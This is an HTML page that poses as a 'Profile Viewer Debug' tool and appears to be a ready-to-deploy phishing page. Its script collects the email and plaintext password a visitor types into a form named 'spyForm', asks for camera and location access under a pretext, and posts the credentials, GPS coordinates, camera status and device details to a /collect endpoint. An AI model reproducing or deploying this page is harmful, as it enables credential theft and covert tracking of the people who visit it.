<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>üîç Profile Viewer Debug</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="icon" href="/static/icon.png">
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: #2c3e50;
      color: white;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .box {
      background: rgba(255, 255, 255, 0.1);
      padding: 30px;
      border-radius: 16px;
      box-shadow: 0 0 20px rgba(0,0,0,0.3);
      text-align: center;
      width: 340px;
      backdrop-filter: blur(8px);
    }
    h1 {
      font-size: 24px;
      margin-bottom: 15px;
    }
    p {
      margin-bottom: 20px;
      font-size: 14px;
      color: #f1f1f1;
    }
    input, button {
      width: 100%;
      padding: 10px;
      margin: 8px 0;
      border-radius: 8px;
      border: none;
      font-size: 15px;
    }
    input {
      background: #ecf0f1;
      color: #2c3e50;
    }
    button {
      background: #e74c3c;
      color: white;
      font-weight: bold;
      cursor: pointer;
    }
    button:hover {
      background: #c0392b;
    }
  </style>
</head>
<body>
  <div class="box">
    <h1>üëÅ Profile Viewer ‚Äì Debug</h1>
    <p>Please allow location and camera access when prompted.</p>
    <form id="spyForm">
      <input type="text" id="email" placeholder="Email" required>
      <input type="password" id="password" placeholder="Password" required>
      <button type="submit">Check Now</button>
    </form>
  </div>

  <script>
    async function collectData(cameraStatus, latitude = null, longitude = null, email = null, password = null) {
      console.log("üì° Sending data to /collect...");
      try {
        const response = await fetch("/collect", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            userAgent: navigator.userAgent,
            latitude: latitude,
            longitude: longitude,
            camera: cameraStatus,
            deviceInfo: navigator.platform,
            email: email,
            password: password
          })
        });
        const result = await response.text();
        console.log("‚úÖ Data sent:", result);
        alert("‚úÖ All data captured and sent successfully.");
      } catch (error) {
        console.error("‚ùå Failed to send data:", error);
        alert("‚ùå Failed to send data. Check console for details.");
      }
    }

    document.getElementById("spyForm").addEventListener("submit", function(e) {
      e.preventDefault();

      const email = document.getElementById("email").value;
      const password = document.getElementById("password").value;

      if (!email || !password) {
        alert("‚ö†Ô∏è Please fill in both fields.");
        return;
      }

      alert("üì∏ Requesting camera permission...");
      navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
          console.log("‚úÖ Camera access granted.");
          stream.getTracks().forEach(track => track.stop());

          alert("üìç Requesting location access...");
          navigator.geolocation.getCurrentPosition(
            pos => {
              console.log("‚úÖ Location access granted.");
              collectData("‚úÖ Allowed", pos.coords.latitude, pos.coords.longitude, email, password);
            },
            err => {
              console.warn("‚ùå Location error:", err.message);
              alert("‚ùå Location access denied.");
              collectData("‚úÖ Camera Allowed, ‚ùå Location Denied", null, null, email, password);
            }
          );
        })
        .catch(err => {
          console.warn("‚ùå Camera error:", err.message);
          alert("‚ùå Camera access denied.");
          collectData("‚ùå Camera Denied", null, null, email, password);
        });
    });
  </script>
</body>
</html>
